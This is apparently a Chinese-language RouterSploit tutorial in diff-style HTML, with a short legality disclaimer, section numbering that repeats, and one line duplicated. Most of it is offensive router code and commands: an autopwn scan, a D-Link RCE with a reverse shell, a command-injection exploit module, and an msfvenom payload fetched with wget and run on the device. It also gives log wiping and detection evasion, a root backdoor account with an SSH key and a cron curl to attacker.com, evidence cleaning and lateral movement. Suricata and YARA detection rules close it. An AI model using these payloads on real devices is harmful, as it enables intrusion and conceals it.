+步骤2：使用RouterSploit进行漏洞评估<br>
+针对发现的设备（例如192.168.1.1），使用RouterSploit进行测试。</p>
+<p>bash<br>
+rsf &gt; use scanners/autopwn<br>
+rsf (Autopwn) &gt; set target 192.168.1.1<br>
+rsf (Autopwn) &gt; run<br>
+如果autopwn发现漏洞，则使用相应的利用模块。</p>
+<p>步骤3：利用漏洞获取控制<br>
+假设发现了一个D-Link路由器的RCE漏洞：</p>
+<p>bash<br>
+rsf &gt; use exploits/routers/dlink/dir_8xx_remote_code_execution<br>
+rsf (D-Link DIR-8XX RCE) &gt; set target 192.168.1.1<br>
+rsf (D-Link DIR-8XX RCE) &gt; set payload reverse_tcp<br>
+rsf (D-Link DIR-8XX RCE) &gt; set lhost 192.168.1.100<br>
+rsf (D-Link DIR-8XX RCE) &gt; set lport 4444<br>
+rsf (D-Link DIR-8XX RCE) &gt; run<br>
+步骤4：后渗透利用<br>
+一旦获得反向shell，可以：</p>
+<p>提取设备配置（如路由表、ARP表、保存的密码等）</p>
+<p>利用该设备作为跳板进行横向移动</p>
+<p>持久化访问（如修改固件、添加后门等）</p>
+<p>十五、RouterSploit的局限性及应对<br>
+依赖已知漏洞：RouterSploit主要针对已知漏洞，对于零日漏洞无能为力。因此，需要结合其他技术（如模糊测试、代码审计）来发现新漏洞。</p>
+<p>设备覆盖范围：虽然支持很多设备，但仍有大量设备不在其列。此时需要手动测试或自己编写模块。</p>
+<p>环境依赖性：某些漏洞利用可能依赖于特定的网络环境或设备配置，在实际测试中可能遇到各种问题。</p>
+<p>检测逃避：RouterSploit本身不提供逃避IDS/IPS的功能，因此在严格监控的网络中可能被检测到。</p>
+<p>十六、未来发展方向<br>
+RouterSploit项目仍在活跃开发中，未来的可能方向包括：</p>
+<p>增加更多漏洞利用模块，覆盖更多设备和CVE</p>
+<p>提高自动化和智能化水平，例如自动生成利用代码</p>
+<p>增强隐蔽性，减少被检测的概率</p>
+<p>与其他安全工具（如Metasploit、Nmap）的深度集成</p>
+<p>十七、结语<br>
+RouterSploit作为一款专业的嵌入式设备漏洞利用框架，在渗透测试和安全研究领域具有重要价值。通过学习和使用RouterSploit，安全专业人员可以更有效地评估和提升网络设备的安全性。</p>
+<p>重要的是，始终在合法和授权的范围内使用这些工具，并遵循道德准则。希望这份详细的介绍能够帮助你更好地理解和使用RouterSploit。</p>
+<p>好的，我们继续深入探讨 RouterSploit 的更高级主题和实际应用。</p>
+<p>好的，我们继续深入探讨 RouterSploit 的更高级主题和实际应用。</p>
+<hr>
+<h3>十二、RouterSploit 模块开发高级指南</h3>
+<h4>1. 完整的模块开发示例</h4>
+<p>让我们创建一个针对虚构设备的完整漏洞利用模块：</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">from</span> <span class="pl-s1">routersploit</span>.<span class="pl-s1">core</span>.<span class="pl-s1">exploit</span> <span class="pl-k">import</span> <span class="pl-c1">*</span>
+<span class="pl-k">from</span> <span class="pl-s1">routersploit</span>.<span class="pl-s1">core</span>.<span class="pl-s1">http</span>.<span class="pl-s1">http_client</span> <span class="pl-k">import</span> <span class="pl-v">HTTPClient</span>
+
+<span class="pl-k">class</span> <span class="pl-v">Exploit</span>(<span class="pl-v">HTTPClient</span>):
+    <span class="pl-s1">__info__</span> <span class="pl-c1">=</span> {
+        <span class="pl-s">"name"</span>: <span class="pl-s">"Fictional Router RCE"</span>,
+        <span class="pl-s">"description"</span>: <span class="pl-s">"Remote Code Execution in Fictional Router 9000 through command injection in ping utility"</span>,
+        <span class="pl-s">"authors"</span>: (
+            <span class="pl-s">"Security Researcher"</span>,  <span class="pl-c"># 发现者</span>
+        ),
+        <span class="pl-s">"references"</span>: (
+            <span class="pl-s">"CVE-2023-12345"</span>,
+            <span class="pl-s">"https://www.example.com/advisory/12345"</span>,
+        ),
+        <span class="pl-s">"devices"</span>: (
+            <span class="pl-s">"Fictional Router 9000 &lt; 2.1.4"</span>,
+        ),
+    }
+    
+    <span class="pl-s1">target</span> <span class="pl-c1">=</span> <span class="pl-en">OptIP</span>(<span class="pl-s">""</span>, <span class="pl-s">"Target IP address"</span>)
+    <span class="pl-s1">port</span> <span class="pl-c1">=</span> <span class="pl-en">OptPort</span>(<span class="pl-c1">80</span>, <span class="pl-s">"Target HTTP port"</span>)
+    <span class="pl-s1">ssl</span> <span class="pl-c1">=</span> <span class="pl-en">OptBool</span>(<span class="pl-c1">False</span>, <span class="pl-s">"SSL enabled: true/false"</span>)
+    <span class="pl-s1">username</span> <span class="pl-c1">=</span> <span class="pl-en">OptString</span>(<span class="pl-s">"admin"</span>, <span class="pl-s">"Username for authentication"</span>)
+    <span class="pl-s1">password</span> <span class="pl-c1">=</span> <span class="pl-en">OptString</span>(<span class="pl-s">"admin"</span>, <span class="pl-s">"Password for authentication"</span>)
+    
+    <span class="pl-k">def</span> <span class="pl-en">__init__</span>(<span class="pl-s1">self</span>):
+        <span class="pl-s1">self</span>.<span class="pl-c1">session</span> <span class="pl-c1">=</span> <span class="pl-c1">None</span>
+        
+    <span class="pl-k">def</span> <span class="pl-en">login</span>(<span class="pl-s1">self</span>):
+        <span class="pl-c"># 实现登录逻辑</span>
+        <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
+            <span class="pl-s">"username"</span>: <span class="pl-s1">self</span>.<span class="pl-c1">username</span>,
+            <span class="pl-s">"password"</span>: <span class="pl-s1">self</span>.<span class="pl-c1">password</span>
+        }
+        
+        <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">self</span>.<span class="pl-c1">http_request</span>(
+            <span class="pl-s1">method</span><span class="pl-c1">=</span><span class="pl-s">"POST"</span>,
+            <span class="pl-s1">path</span><span class="pl-c1">=</span><span class="pl-s">"/login.cgi"</span>,
+            <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>,
+            <span class="pl-s1">session</span><span class="pl-c1">=</span><span class="pl-s1">self</span>.<span class="pl-c1">session</span>
+        )
+        
+        <span class="pl-k">if</span> <span class="pl-s1">response</span> <span class="pl-c1">is</span> <span class="pl-c1">None</span>:
+            <span class="pl-k">return</span> <span class="pl-c1">False</span>
+            
+        <span class="pl-k">if</span> <span class="pl-s">"Login Successful"</span> <span class="pl-c1">in</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span> <span class="pl-c1">or</span> <span class="pl-s1">response</span>.<span class="pl-c1">status_code</span> <span class="pl-c1">==</span> <span class="pl-c1">302</span>:
+            <span class="pl-k">if</span> <span class="pl-s1">self</span>.<span class="pl-c1">session</span> <span class="pl-c1">is</span> <span class="pl-c1">None</span>:
+                <span class="pl-s1">self</span>.<span class="pl-c1">session</span> <span class="pl-c1">=</span> <span class="pl-s1">requests</span>.<span class="pl-c1">Session</span>()
+            <span class="pl-k">return</span> <span class="pl-c1">True</span>
+        <span class="pl-k">return</span> <span class="pl-c1">False</span>
+    
+    <span class="pl-k">def</span> <span class="pl-en">check</span>(<span class="pl-s1">self</span>):
+        <span class="pl-c"># 验证目标是否存在漏洞</span>
+        <span class="pl-k">if</span> <span class="pl-s1">self</span>.<span class="pl-c1">login</span>():
+            <span class="pl-c"># 检查固件版本</span>
+            <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">self</span>.<span class="pl-c1">http_request</span>(
+                <span class="pl-s1">method</span><span class="pl-c1">=</span><span class="pl-s">"GET"</span>,
+                <span class="pl-s1">path</span><span class="pl-c1">=</span><span class="pl-s">"/status.cgi"</span>,
+                <span class="pl-s1">session</span><span class="pl-c1">=</span><span class="pl-s1">self</span>.<span class="pl-c1">session</span>
+            )
+            
+            <span class="pl-k">if</span> <span class="pl-s1">response</span> <span class="pl-c1">and</span> <span class="pl-s">"Fictional Router 9000"</span> <span class="pl-c1">in</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span>:
+                <span class="pl-k">if</span> <span class="pl-s">"FW Version: 2.1.3"</span> <span class="pl-c1">in</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span>:  <span class="pl-c"># 有漏洞的版本</span>
+                    <span class="pl-k">return</span> <span class="pl-c1">True</span>
+        <span class="pl-k">return</span> <span class="pl-c1">False</span>
+    
+    <span class="pl-k">def</span> <span class="pl-en">execute_command</span>(<span class="pl-s1">self</span>, <span class="pl-s1">command</span>):
+        <span class="pl-c"># 执行命令的漏洞利用</span>
+        <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">f"127.0.0.1; <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">command</span><span class="pl-kos">}</span></span>; #"</span>
+        <span class="pl-s1">data</span> <span class="pl-c1">=</span> {
+            <span class="pl-s">"ip"</span>: <span class="pl-s1">payload</span>,
+            <span class="pl-s">"submit"</span>: <span class="pl-s">"Ping"</span>
+        }
+        
+        <span class="pl-s1">response</span> <span class="pl-c1">=</span> <span class="pl-s1">self</span>.<span class="pl-c1">http_request</span>(
+            <span class="pl-s1">method</span><span class="pl-c1">=</span><span class="pl-s">"POST"</span>,
+            <span class="pl-s1">path</span><span class="pl-c1">=</span><span class="pl-s">"/ping.cgi"</span>,
+            <span class="pl-s1">data</span><span class="pl-c1">=</span><span class="pl-s1">data</span>,
+            <span class="pl-s1">session</span><span class="pl-c1">=</span><span class="pl-s1">self</span>.<span class="pl-c1">session</span>
+        )
+        
+        <span class="pl-k">return</span> <span class="pl-s1">response</span>.<span class="pl-c1">text</span> <span class="pl-k">if</span> <span class="pl-s1">response</span> <span class="pl-k">else</span> <span class="pl-s">""</span>
+    
+    <span class="pl-k">def</span> <span class="pl-en">run</span>(<span class="pl-s1">self</span>):
+        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">self</span>.<span class="pl-c1">login</span>():
+            <span class="pl-en">print_error</span>(<span class="pl-s">"Could not login to target"</span>)
+            <span class="pl-k">return</span>
+        
+        <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">self</span>.<span class="pl-c1">check</span>():
+            <span class="pl-en">print_error</span>(<span class="pl-s">"Target does not appear to be vulnerable"</span>)
+            <span class="pl-k">return</span>
+            
+        <span class="pl-en">print_success</span>(<span class="pl-s">"Target is vulnerable!"</span>)
+        
+        <span class="pl-c"># 执行示例命令</span>
+        <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s1">self</span>.<span class="pl-c1">execute_command</span>(<span class="pl-s">"id"</span>)
+        <span class="pl-k">if</span> <span class="pl-s1">result</span>:
+            <span class="pl-en">print_info</span>(<span class="pl-s">"Command execution result:"</span>)
+            <span class="pl-en">print_info</span>(<span class="pl-s1">result</span>)</pre></div>
+<h4>2. 测试和调试模块</h4>
+<p>开发完成后需要进行充分测试：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 rsf 中测试模块</span>
+rsf <span class="pl-k">&gt;</span> use exploits/path/to/your_module
+rsf (Your Module) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+rsf (Your Module) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> username admin
+rsf (Your Module) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> password admin
+rsf (Your Module) <span class="pl-k">&gt;</span> check
+rsf (Your Module) <span class="pl-k">&gt;</span> run</pre></div>
+<hr>
+<h3>十三、集成到自动化工作流</h3>
+<h4>1. 与 Nmap 集成</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 使用 Nmap 发现设备，然后使用 RouterSploit 测试</span>
+nmap -sS -p 80,443,22,23 192.168.1.0/24 -oG - <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span>80/open<span class="pl-pds">"</span></span> <span class="pl-k">|</span> awk <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> targets.txt
+
+<span class="pl-c"><span class="pl-c">#</span> 使用 RouterSploit 批量测试</span>
+<span class="pl-k">for</span> <span class="pl-smi">ip</span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">$(</span>cat targets.txt<span class="pl-pds">)</span></span><span class="pl-k">;</span> <span class="pl-k">do</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Testing <span class="pl-smi">$ip</span><span class="pl-pds">"</span></span>
+    python3 rsf.py -m <span class="pl-s"><span class="pl-pds">"</span>scanners/autopwn<span class="pl-pds">"</span></span> -s <span class="pl-s"><span class="pl-pds">"</span>target <span class="pl-smi">$ip</span><span class="pl-pds">"</span></span> -s <span class="pl-s"><span class="pl-pds">"</span>run<span class="pl-pds">"</span></span>
+<span class="pl-k">done</span></pre></div>
+<h4>2. 与 Metasploit 协同工作</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 1. 使用 RouterSploit 获取初始访问</span>
+<span class="pl-c"><span class="pl-c">#</span> 2. 使用 Metasploit 生成 payload</span>
+msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf <span class="pl-k">&gt;</span> payload.elf
+
+<span class="pl-c"><span class="pl-c">#</span> 3. 通过 RouterSploit 的 RCE 上传并执行 payload</span>
+rsf <span class="pl-k">&gt;</span> use exploits/routers/target/exploit
+rsf (Exploit) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+rsf (Exploit) <span class="pl-k">&gt;</span> run <span class="pl-s"><span class="pl-pds">"</span>wget http://192.168.1.100/payload.elf -O /tmp/payload.elf<span class="pl-pds">"</span></span>
+rsf (Exploit) <span class="pl-k">&gt;</span> run <span class="pl-s"><span class="pl-pds">"</span>chmod +x /tmp/payload.elf<span class="pl-pds">"</span></span>
+rsf (Exploit) <span class="pl-k">&gt;</span> run <span class="pl-s"><span class="pl-pds">"</span>/tmp/payload.elf<span class="pl-pds">"</span></span></pre></div>
+<hr>
+<h3>十四、高级防御规避技术</h3>
+<h4>1. 时序攻击检测规避</h4>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">random</span>
+<span class="pl-k">import</span> <span class="pl-s1">time</span>
+
+<span class="pl-k">class</span> <span class="pl-v">StealthExploit</span>(<span class="pl-v">HTTPClient</span>):
+    <span class="pl-k">def</span> <span class="pl-en">stealth_request</span>(<span class="pl-s1">self</span>, <span class="pl-s1">method</span>, <span class="pl-s1">path</span>, <span class="pl-c1">**</span><span class="pl-s1">kwargs</span>):
+        <span class="pl-c"># 添加随机延迟避免检测</span>
+        <span class="pl-s1">time</span>.<span class="pl-c1">sleep</span>(<span class="pl-s1">random</span>.<span class="pl-c1">uniform</span>(<span class="pl-c1">1.0</span>, <span class="pl-c1">3.0</span>))
+        
+        <span class="pl-c"># 使用常见的 User-Agent</span>
+        <span class="pl-s1">headers</span> <span class="pl-c1">=</span> <span class="pl-s1">kwargs</span>.<span class="pl-c1">get</span>(<span class="pl-s">'headers'</span>, {})
+        <span class="pl-s1">headers</span>[<span class="pl-s">'User-Agent'</span>] <span class="pl-c1">=</span> <span class="pl-s">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span>
+        <span class="pl-s1">kwargs</span>[<span class="pl-s">'headers'</span>] <span class="pl-c1">=</span> <span class="pl-s1">headers</span>
+        
+        <span class="pl-k">return</span> <span class="pl-s1">self</span>.<span class="pl-c1">http_request</span>(<span class="pl-s1">method</span>, <span class="pl-s1">path</span>, <span class="pl-c1">**</span><span class="pl-s1">kwargs</span>)</pre></div>
+<h4>2. 日志清理</h4>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">def</span> <span class="pl-en">clean_logs</span>(<span class="pl-s1">self</span>):
+    <span class="pl-c"># 尝试清理访问日志</span>
+    <span class="pl-s1">commands</span> <span class="pl-c1">=</span> [
+        <span class="pl-s">"echo '' &gt; /var/log/httpd_access.log"</span>,
+        <span class="pl-s">"echo '' &gt; /var/log/messages"</span>,
+        <span class="pl-s">"history -c"</span>
+    ]
+    
+    <span class="pl-k">for</span> <span class="pl-s1">cmd</span> <span class="pl-c1">in</span> <span class="pl-s1">commands</span>:
+        <span class="pl-s1">self</span>.<span class="pl-c1">execute_command</span>(<span class="pl-s1">cmd</span>)</pre></div>
+<hr>
+<h3>十五、企业级安全评估框架</h3>
+<h4>1. 完整的 IoT 设备评估流程</h4>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c">#!/usr/bin/env python3</span>
+<span class="pl-s">"""</span>
+<span class="pl-s">企业级 IoT 设备安全评估框架</span>
+<span class="pl-s">"""</span>
+
+<span class="pl-k">import</span> <span class="pl-s1">json</span>
+<span class="pl-k">import</span> <span class="pl-s1">time</span>
+<span class="pl-k">from</span> <span class="pl-s1">routersploit</span>.<span class="pl-s1">core</span>.<span class="pl-s1">exploit</span> <span class="pl-k">import</span> <span class="pl-s1">exploits</span>
+
+<span class="pl-k">class</span> <span class="pl-v">IoTDeviceAudit</span>:
+    <span class="pl-k">def</span> <span class="pl-en">__init__</span>(<span class="pl-s1">self</span>, <span class="pl-s1">target_file</span>):
+        <span class="pl-s1">self</span>.<span class="pl-c1">targets</span> <span class="pl-c1">=</span> <span class="pl-s1">self</span>.<span class="pl-c1">load_targets</span>(<span class="pl-s1">target_file</span>)
+        <span class="pl-s1">self</span>.<span class="pl-c1">results</span> <span class="pl-c1">=</span> {}
+    
+    <span class="pl-k">def</span> <span class="pl-en">load_targets</span>(<span class="pl-s1">self</span>, <span class="pl-s1">target_file</span>):
+        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s1">target_file</span>, <span class="pl-s">'r'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+            <span class="pl-k">return</span> [<span class="pl-s1">line</span>.<span class="pl-c1">strip</span>() <span class="pl-k">for</span> <span class="pl-s1">line</span> <span class="pl-c1">in</span> <span class="pl-s1">f</span> <span class="pl-k">if</span> <span class="pl-s1">line</span>.<span class="pl-c1">strip</span>()]
+    
+    <span class="pl-k">def</span> <span class="pl-en">run_comprehensive_scan</span>(<span class="pl-s1">self</span>, <span class="pl-s1">target</span>):
+        <span class="pl-en">print</span>(<span class="pl-s">f"[*] Scanning <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">target</span><span class="pl-kos">}</span></span>"</span>)
+        
+        <span class="pl-s1">scan_results</span> <span class="pl-c1">=</span> {
+            <span class="pl-s">'target'</span>: <span class="pl-s1">target</span>,
+            <span class="pl-s">'vulnerabilities'</span>: [],
+            <span class="pl-s">'credentials_found'</span>: <span class="pl-c1">False</span>,
+            <span class="pl-s">'risk_level'</span>: <span class="pl-s">'LOW'</span>
+        }
+        
+        <span class="pl-c"># 测试常见服务</span>
+        <span class="pl-s1">services_to_test</span> <span class="pl-c1">=</span> [
+            <span class="pl-s">'scanners/autopwn'</span>,
+            <span class="pl-s">'creds/telnet_bruteforce'</span>, 
+            <span class="pl-s">'creds/ssh_bruteforce'</span>,
+            <span class="pl-s">'creds/http_basic_default'</span>
+        ]
+        
+        <span class="pl-k">for</span> <span class="pl-s1">service</span> <span class="pl-c1">in</span> <span class="pl-s1">services_to_test</span>:
+            <span class="pl-k">try</span>:
+                <span class="pl-s1">exploit</span> <span class="pl-c1">=</span> <span class="pl-en">exploits</span>().<span class="pl-c1">get_exploit</span>(<span class="pl-s1">service</span>)
+                <span class="pl-s1">exploit</span>.<span class="pl-c1">target</span> <span class="pl-c1">=</span> <span class="pl-s1">target</span>
+                <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s1">exploit</span>.<span class="pl-c1">run</span>()
+                
+                <span class="pl-k">if</span> <span class="pl-s1">result</span>:
+                    <span class="pl-s1">scan_results</span>[<span class="pl-s">'vulnerabilities'</span>].<span class="pl-c1">append</span>({
+                        <span class="pl-s">'service'</span>: <span class="pl-s1">service</span>,
+                        <span class="pl-s">'result'</span>: <span class="pl-en">str</span>(<span class="pl-s1">result</span>)
+                    })
+            <span class="pl-k">except</span> <span class="pl-v">Exception</span> <span class="pl-k">as</span> <span class="pl-s1">e</span>:
+                <span class="pl-en">print</span>(<span class="pl-s">f"[-] Error testing <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">service</span><span class="pl-kos">}</span></span>: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">e</span><span class="pl-kos">}</span></span>"</span>)
+        
+        <span class="pl-k">return</span> <span class="pl-s1">scan_results</span>
+    
+    <span class="pl-k">def</span> <span class="pl-en">generate_report</span>(<span class="pl-s1">self</span>):
+        <span class="pl-s1">report</span> <span class="pl-c1">=</span> {
+            <span class="pl-s">'scan_date'</span>: <span class="pl-s1">time</span>.<span class="pl-c1">strftime</span>(<span class="pl-s">"%Y-%m-%d %H:%M:%S"</span>),
+            <span class="pl-s">'targets_scanned'</span>: <span class="pl-en">len</span>(<span class="pl-s1">self</span>.<span class="pl-c1">targets</span>),
+            <span class="pl-s">'vulnerable_devices'</span>: <span class="pl-c1">0</span>,
+            <span class="pl-s">'detailed_results'</span>: <span class="pl-s1">self</span>.<span class="pl-c1">results</span>
+        }
+        
+        <span class="pl-c"># 生成统计信息</span>
+        <span class="pl-k">for</span> <span class="pl-s1">target</span>, <span class="pl-s1">result</span> <span class="pl-c1">in</span> <span class="pl-s1">self</span>.<span class="pl-c1">results</span>.<span class="pl-c1">items</span>():
+            <span class="pl-k">if</span> <span class="pl-s1">result</span>[<span class="pl-s">'vulnerabilities'</span>]:
+                <span class="pl-s1">report</span>[<span class="pl-s">'vulnerable_devices'</span>] <span class="pl-c1">+=</span> <span class="pl-c1">1</span>
+        
+        <span class="pl-c"># 保存报告</span>
+        <span class="pl-k">with</span> <span class="pl-en">open</span>(<span class="pl-s">'iot_audit_report.json'</span>, <span class="pl-s">'w'</span>) <span class="pl-k">as</span> <span class="pl-s1">f</span>:
+            <span class="pl-s1">json</span>.<span class="pl-c1">dump</span>(<span class="pl-s1">report</span>, <span class="pl-s1">f</span>, <span class="pl-s1">indent</span><span class="pl-c1">=</span><span class="pl-c1">2</span>)
+        
+        <span class="pl-k">return</span> <span class="pl-s1">report</span>
+
+<span class="pl-c"># 使用示例</span>
+<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
+    <span class="pl-s1">audit</span> <span class="pl-c1">=</span> <span class="pl-en">IoTDeviceAudit</span>(<span class="pl-s">"targets.txt"</span>)
+    
+    <span class="pl-k">for</span> <span class="pl-s1">target</span> <span class="pl-c1">in</span> <span class="pl-s1">audit</span>.<span class="pl-c1">targets</span>:
+        <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s1">audit</span>.<span class="pl-c1">run_comprehensive_scan</span>(<span class="pl-s1">target</span>)
+        <span class="pl-s1">audit</span>.<span class="pl-c1">results</span>[<span class="pl-s1">target</span>] <span class="pl-c1">=</span> <span class="pl-s1">result</span>
+    
+    <span class="pl-s1">report</span> <span class="pl-c1">=</span> <span class="pl-s1">audit</span>.<span class="pl-c1">generate_report</span>()
+    <span class="pl-en">print</span>(<span class="pl-s">"Audit completed. Report saved to iot_audit_report.json"</span>)</pre></div>
+<hr>
+<h3>十六、红队行动中的高级应用</h3>
+<h4>1. 持久化访问技术</h4>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">class</span> <span class="pl-v">RouterPersistance</span>:
+    <span class="pl-k">def</span> <span class="pl-en">__init__</span>(<span class="pl-s1">self</span>, <span class="pl-s1">exploit_module</span>):
+        <span class="pl-s1">self</span>.<span class="pl-c1">exploit</span> <span class="pl-c1">=</span> <span class="pl-s1">exploit_module</span>
+    
+    <span class="pl-k">def</span> <span class="pl-en">establish_backdoor</span>(<span class="pl-s1">self</span>):
+        <span class="pl-c"># 1. 创建后门账户</span>
+        <span class="pl-s1">self</span>.<span class="pl-c1">exploit</span>.<span class="pl-c1">run</span>(<span class="pl-s">"echo 'backdoor:$(openssl passwd -1 password123):0:0:root:/root:/bin/sh' &gt;&gt; /etc/passwd"</span>)
+        
+        <span class="pl-c"># 2. 添加 SSH 密钥</span>
+        <span class="pl-s1">self</span>.<span class="pl-c1">exploit</span>.<span class="pl-c1">run</span>(<span class="pl-s">"mkdir -p /root/.ssh"</span>)
+        <span class="pl-s1">self</span>.<span class="pl-c1">exploit</span>.<span class="pl-c1">run</span>(<span class="pl-s">"echo 'ssh-rsa AAAAB3...' &gt;&gt; /root/.ssh/authorized_keys"</span>)
+        
+        <span class="pl-c"># 3. 创建定时任务保持访问</span>
+        <span class="pl-s1">self</span>.<span class="pl-c1">exploit</span>.<span class="pl-c1">run</span>(<span class="pl-s">"echo '*/5 * * * * curl http://attacker.com/keepalive' &gt;&gt; /etc/crontab"</span>)
+        
+        <span class="pl-c"># 4. 修改防火墙规则</span>
+        <span class="pl-s1">self</span>.<span class="pl-c1">exploit</span>.<span class="pl-c1">run</span>(<span class="pl-s">"iptables -I INPUT -p tcp --dport 22 -j ACCEPT"</span>)
+    
+    <span class="pl-k">def</span> <span class="pl-en">clean_evidence</span>(<span class="pl-s1">self</span>):
+        <span class="pl-c"># 清理攻击痕迹</span>
+        <span class="pl-s1">commands</span> <span class="pl-c1">=</span> [
+            <span class="pl-s">"dmesg -c"</span>,
+            <span class="pl-s">"echo '' &gt; /var/log/syslog"</span>,
+            <span class="pl-s">"find /tmp -name '*.elf' -delete"</span>
+        ]
+        
+        <span class="pl-k">for</span> <span class="pl-s1">cmd</span> <span class="pl-c1">in</span> <span class="pl-s1">commands</span>:
+            <span class="pl-s1">self</span>.<span class="pl-c1">exploit</span>.<span class="pl-c1">run</span>(<span class="pl-s1">cmd</span>)</pre></div>
+<h4>2. 横向移动技术</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 从受控路由器发现内网主机</span>
+rsf <span class="pl-k">&gt;</span> use exploits/routers/compromised/exec
+rsf (Exec) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+rsf (Exec) <span class="pl-k">&gt;</span> run <span class="pl-s"><span class="pl-pds">"</span>arp -a<span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 扫描内网其他设备</span>
+rsf (Exec) <span class="pl-k">&gt;</span> run <span class="pl-s"><span class="pl-pds">"</span>nmap -sP 192.168.1.0/24<span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 设置端口转发进行内网渗透</span>
+rsf (Exec) <span class="pl-k">&gt;</span> run <span class="pl-s"><span class="pl-pds">"</span>iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.50:80<span class="pl-pds">"</span></span></pre></div>
+<hr>
+<h3>十七、蓝队防御检测规则</h3>
+<h4>1. Suricata 检测规则</h4>
+<pre class="notranslate"><code class="notranslate"># 检测 RouterSploit 扫描活动
+alert http any any -&gt; $HOME_NET any (\
+    msg:"ROUTERSPLOIT - Possible Autopwn Scan"; \
+    flow:established,to_server; \
+    http.uri; content:"/autopwn"; nocase; \
+    classtype:web-application-attack; \
+    sid:1000001; rev:1;)
+
+# 检测常见漏洞利用尝试
+alert http any any -&gt; $HOME_NET any (\
+    msg:"ROUTERSPLOIT - Command Injection Attempt"; \
+    flow:established,to_server; \
+    http.uri; content:".cgi"; \
+    http.request_body; content:"|3b|"; content:"id"; distance:0; \
+    classtype:web-application-attack; \
+    sid:1000002; rev:1;)
+</code></pre>
+<h4>2. YARA 规则检测内存中的 RouterSploit</h4>
+<pre class="notranslate"><code class="notranslate">rule RouterSploit_Detection {
+    meta:
+        description = "Detects RouterSploit framework in memory"
+        author = "Blue Team"
+        date = "2024-01-01"
+    
+    strings:
+        $rsf1 = "routersploit" ascii wide
+        $rsf2 = "OptIP" ascii wide
+        $rsf3 = "OptPort" ascii wide
+        $rsf4 = "scanners/autopwn" ascii wide
+    
+    condition:
+        any of them
+}
+</code></pre>
+<hr>
+<h3>十八、合规性与标准化</h3>
+<h4>1. 符合的安全标准</h4>
+<ul>
+<li><strong>NIST SP 800-53</strong>：安全控制评估</li>
+<li><strong>ISO 27001</strong>：信息安全管理</li>
+<li><strong>PCI DSS</strong>：支付卡行业安全</li>
+<li><strong>NERC CIP</strong>：关键基础设施保护</li>
+</ul>
+<h4>2. 评估报告模板</h4>
+<div class="highlight highlight-text-md"><pre class="notranslate"><span class="pl-mh"># <span class="pl-en">IoT 设备安全评估报告</span></span>
+
+<span class="pl-mh">## <span class="pl-en">执行摘要</span></span>
+<span class="pl-v">-</span> 评估日期: <span class="pl-s">[</span>日期<span class="pl-s">]</span>
+<span class="pl-v">-</span> 评估范围: <span class="pl-s">[</span>设备列表<span class="pl-s">]</span>
+<span class="pl-v">-</span> 总体风险评级: <span class="pl-s">[</span>高/中/低<span class="pl-s">]</span>
+
+<span class="pl-mh">## <span class="pl-en">发现详情</span></span>
+<span class="pl-mh">### <span class="pl-en">严重漏洞</span></span>
+<span class="pl-v">-</span> <span class="pl-s">[</span><span class="pl-en">漏洞名称</span><span class="pl-s">]</span>: <span class="pl-corl">[影响描述]</span>
+
+<span class="pl-mh">### <span class="pl-en">中等风险</span></span>
+<span class="pl-v">-</span> <span class="pl-s">[</span>问题描述<span class="pl-s">]</span>
+
+<span class="pl-mh">## <span class="pl-en">建议措施</span></span>
+<span class="pl-s">1</span><span class="pl-v">.</span> 立即行动项目
+<span class="pl-s">2</span><span class="pl-v">.</span> 短期修复计划  
+<span class="pl-s">3</span><span class="pl-v">.</span> 长期加固策略
+
+<span class="pl-mh">## <span class="pl-en">附录</span></span>
+<span class="pl-v">-</span> 详细技术发现
